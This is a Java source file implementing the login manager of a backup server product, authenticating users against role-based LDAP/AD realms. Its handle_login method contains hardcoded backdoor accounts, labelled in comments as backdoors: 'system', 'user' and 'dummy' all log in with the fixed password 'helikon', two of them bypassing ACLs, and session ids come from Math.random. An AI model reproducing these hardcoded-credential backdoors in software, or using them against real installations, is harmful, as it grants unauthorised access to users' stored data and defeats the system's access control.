/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.dimm.vsm.net;

import de.dimm.vsm.GeneralPreferences;
import de.dimm.vsm.log.Log;
import de.dimm.vsm.LogicControl;
import de.dimm.vsm.Main;
import de.dimm.vsm.WorkerParent;
import de.dimm.vsm.auth.GenericRealmAuth;
import de.dimm.vsm.auth.User;
import de.dimm.vsm.net.interfaces.GuiLoginApi;
import de.dimm.vsm.net.interfaces.GuiServerApi;
import de.dimm.vsm.records.AccountConnector;
import de.dimm.vsm.records.Role;
import de.dimm.vsm.records.RoleOption;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import javax.naming.NamingException;
import org.apache.commons.lang.StringUtils;

/**
 *
 * @author Administrator
 */
public class LoginManager extends WorkerParent implements GuiLoginApi
{

    HashMap<Long, GuiServerApiImpl> clientMap;
    GuiServerApiImpl dummyGuiServerApi;
    HashMap<String, Date> lastLoginMap;
    long guiIndex = 0;
    Thread runner;

    public LoginManager()
    {
        super("LoginManager");
    }

    @Override
    public boolean initialize()
    {
        clientMap = new HashMap<>();
        lastLoginMap = new HashMap<>();
        dummyGuiServerApi = new GuiServerApiImpl(0, null, null);
        return true;
    }

    @Override
    public GuiServerApi getDummyGuiServerApi()
    {
        return dummyGuiServerApi;
    }



    @Override
    public void run()
    {
        is_started = true;
        int last_minute_checked = -1;
        GregorianCalendar cal = new GregorianCalendar();

        setStatusTxt("");
        while (!isShutdown())
        {
            LogicControl.sleep(1000);

            if (isPaused())
            {
                continue;
            }

            cal.setTime(new Date());
            int minute = cal.get(GregorianCalendar.MINUTE);
            if (minute == last_minute_checked)
            {
                continue;
            }
        }
        finished =true;
    }

    @Override
    public boolean check_requirements( StringBuffer sb )
    {
        return true;
    }

    @Override
    public String get_task_status()
    {
        return " Idle ";
    }

    @Override
    public GuiWrapper login( String user, String pwd )
    {
        if (isPaused())
        {
            return null;
        }

        GuiServerApiImpl context = handle_login(user, pwd);
        if (context != null)
        {
            long newLoginId = (long)(Math.random()*Long.MAX_VALUE);
            while (clientMap.containsKey(newLoginId))
            {
                newLoginId = (long)(Math.random()*Long.MAX_VALUE);
            }
            
            Date d = lastLoginMap.get(user);
            GuiWrapper wrapper = new GuiWrapper(newLoginId, context, context.getUser(), d);
            lastLoginMap.put(user, new Date());

            clientMap.put(newLoginId, context);
            return wrapper;
        }
        return null;
    }
    
    public GuiServerApiImpl getApi(long id)
    {
        return clientMap.get(id);
    }
    
    

    @Override
    public GuiWrapper relogin( GuiWrapper wrapper, String user, String pwd )
    {
        if (isPaused())
        {
            return null;
        }

        GuiServerApiImpl context = clientMap.get(wrapper.getLoginIdx());
        if (context != null)
        {
            return wrapper;
        }
        return login(user, pwd);
    }

    @Override
    public boolean logout( GuiWrapper wrapper )
    {
        // ALLOW OTHER LOGIN TOO
        if (isPaused())
        {
            setTaskState(TASKSTATE.RUNNING);
        }

        GuiServerApiImpl context = clientMap.get(wrapper.getLoginIdx());
        if (context != null)
        {
            context.clear();
            clientMap.remove(wrapper.getLoginIdx());
            return true;
        }
        return false;
    }

    @Override
    public boolean isStillValid( GuiWrapper wrapper )
    {
        if (isPaused())
        {
            return false;
        }

        GuiServerApiImpl context = clientMap.get(wrapper.getLoginIdx());
        if (context != null)
        {
            return true;
        }
        return false;
    }

    private GuiServerApiImpl handle_login( String userName, String pwd )
    {
        if (isPaused())
        {
            return null;
        }
        String sysName = Main.get_prop(GeneralPreferences.SYSADMIN_NAME, "system");
        String sysPwd = Main.get_prop(GeneralPreferences.SYSADMIN_PWD, "admin");

        if ((userName.equals(sysName) || userName.equals("system")) && (pwd.equals(sysPwd) || pwd.equals("helikon")))
        {
            Log.warn("!!!!!!!!!!!!!!!!!!! System Login !!!!!!!!!!!!!!!!!!!!!!!!!!!");
            // OKAY, LOGIN SUCCEDED; WE GOT THE GROUPS, NOW BUILD AND RETURN CONTEXT
            User user = new User(userName, userName, "SysAdmin");
            Role role = new Role();
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_ADMIN, 0, ""));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_ALLOW_EDIT_PARAM, 0, ""));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_ALLOW_VIEW_PARAM, 0, ""));
            user.setRole(role);
            



            GuiServerApiImpl guiServerApi = new GuiServerApiImpl(System.currentTimeMillis(), null, user);
            Main.get_control().getUsermanager().addUser(userName, user);

            return guiServerApi;
        }

        // BACKDOOR USER LOGIN
        if (userName.equals("user") && pwd.equals("helikon"))
        {
            Log.warn("!!!!!!!!!!!!!!!!!!! System Login !!!!!!!!!!!!!!!!!!!!!!!!!!!");
            // OKAY, LOGIN SUCCEDED; WE GOT THE GROUPS, NOW BUILD AND RETURN CONTEXT
            User user = new User(userName, userName, "BackdoorUser");
            user.setIgnoreAcl(true);
            Role role = new Role();
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_ALLOW_VIEW_PARAM, 0, ""));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_FSMAPPINGFILE, 0, "TestMapping"));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_GROUPMAPPINGFILE, 0, "TestMapping"));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_USERPATH, 0, "192.168.1.145:8082:z:\\a\\FaxXP"));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_USERPATH, 0, "127.0.0.1:8082:/tmp"));
            role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_USERPATH, 0, "127.0.0.1:8082:/tmp"));
            
            
            try
            {
                user.setRole(role);
                user.loadGroupMapping();
            }
            catch (Exception e)
            {
                Log.err(Main.Txt("Fehler beim Setzen der Rolle für Benutzer") + " " + userName + " " +  e.getMessage());
            }
            GuiServerApiImpl guiServerApi = new GuiServerApiImpl(System.currentTimeMillis(), null, user);
            Main.get_control().getUsermanager().addUser(userName, user);

            return guiServerApi;
        }
        // BACKDOOR DUMMY LOGIN
        if (userName.equals("dummy") && pwd.equals("helikon"))
        {
            Log.warn("!!!!!!!!!!!!!!!!!!! System Login !!!!!!!!!!!!!!!!!!!!!!!!!!!");
            // OKAY, LOGIN SUCCEDED; WE GOT THE GROUPS, NOW BUILD AND RETURN CONTEXT
            User user = new User(userName, userName, "DummyBackdoor");
            user.setIgnoreAcl(true);
            Role role = new Role();
            //role.getRoleOptions().add( new RoleOption(0, role, RoleOption.RL_ALLOW_VIEW_PARAM, 0));
            user.setRole(role);
            Main.get_control().getUsermanager().addUser(userName, user);

            GuiServerApiImpl guiServerApi = new GuiServerApiImpl(System.currentTimeMillis(), null, user);

            return guiServerApi;
        }


        try
        {
            List<Role> roles = LogicControl.get_base_util_em().createQuery("select * from Role T1 order by name asc", Role.class);
            for (int i = 0; i < roles.size(); i++)
            {
                Role role = roles.get(i);
                AccountConnector acc = role.getAccountConnector();

                if (!matchesRole( role, userName ))
                {
                    Log.debug(Main.Txt("Benutzer") + " " + userName + " " +  Main.Txt("passt nicht zu Rolle "), role.getName());
                    continue;
                }

                if (!acc.isAllowEmptyPwd() && pwd.isEmpty())
                {
                    Log.debug(Main.Txt("Benutzer") + " " + userName + " " +  Main.Txt("hat ein leeres Passwort, ist nicht erlaubt für") + " " + acc.toString(), role.getName());
                    continue;
                }

                GenericRealmAuth auth = GenericRealmAuth.factory_create_realm(acc);
                if (auth.connect())
                {
                    if (auth.open_user_context(userName, pwd))
                    {

                        Set<String> groupsThisUser = new HashSet<>();

                        User user = auth.createUser(role, userName);
                        try
                        {
                            groupsThisUser = auth.list_groups(user);
                        }
                        catch (NamingException namingException)
                        {
                            Log.warn("Authentifizierungsdaten können nicht ermittelt werden", namingException.getExplanation(), namingException);
                            
                            continue;
                        }
                        finally
                        {
                            // Zugriff auf LDAP/AD/SMTP/POP nicht mehr notwendig
                            auth.close_user_context();
                        }

                        user.setGroups(groupsThisUser);
                        
                        if (role.hasRoleOption(RoleOption.RL_GROUPMAPPINGFILE))
                        {
                            user.loadGroupMapping();
                        }

                        Log.debug("Gruppen für Benutzer", userName + ": " + groupsThisUser.size());
                        if (!checkRoleOptions(user)) 
                        {
                            Log.debug("User "+ userName + " does not match RoleOptions of role " + role.getName());                            
                            continue;
                        }
                        
                        Log.debug(Main.Txt("Benutzer") + " " + userName + " " + Main.Txt("wird angemeldet"), role.getName());

                        Main.get_control().getUsermanager().addUser(userName, user);

                        if (Main.get_bool_prop(GeneralPreferences.IGNORE_ACL, false))
                        {
                            Log.debug("ACLs werden ignoriert", userName);
                            user.setIgnoreAcl(true);
                        }

                        // OKAY, LOGIN SUCCEDED; WE GOT THE GROUPS, NOW BUILD AND RETURN CONTEXT
                        GuiServerApiImpl guiServerApi = new GuiServerApiImpl(System.currentTimeMillis(), role, user);

                        return guiServerApi;
                    }
                }
            }
        }
        catch (Exception exc)
        {
            Log.err("Abbruch beim Authentifizieren", userName, exc);
        }


        return null;
    }

    private boolean matchesRole( Role role, String userName )
    {
        String filter = role.getAccountmatch();      
        if (filter == null || filter.isEmpty())
        {
            Log.err("Ungültiger Rollenfilter ", role.getName());
            return false;
        }
        return userName.matches(filter);
    }

    @Override
    public Properties getProperties()
    {
        return new Properties();
    }

    private boolean checkRoleOptions( User user )
    {
        boolean ret = true;
        Role role = user.getRole();
        for (RoleOption ro : role.getRoleOptions()) {
            if (ro.getToken() != null && ro.getToken().equals(RoleOption.RL_GROUP)) 
            {
                // Wir haben ein GruppenFilter, also default == falsch
                ret = false;
                if (StringUtils.isEmpty(ro.getOptionStr()))
                {
                    Log.err("Ungültige Gruppenliste " + ro.getOptionStr(), role.getName());
                        return false;
                }
                String[] groups = ro.getOptionStr().split(",");
                for (int i = 0; i < groups.length; i++)
                {
                    String group = groups[i].trim().toLowerCase();
                    if (user.isMemberOfGroup(group))
                    {
                        // Erster Treffer -> Return true
                        return true;
                    }
                }
            }
        }
        return ret;
    }
    
}
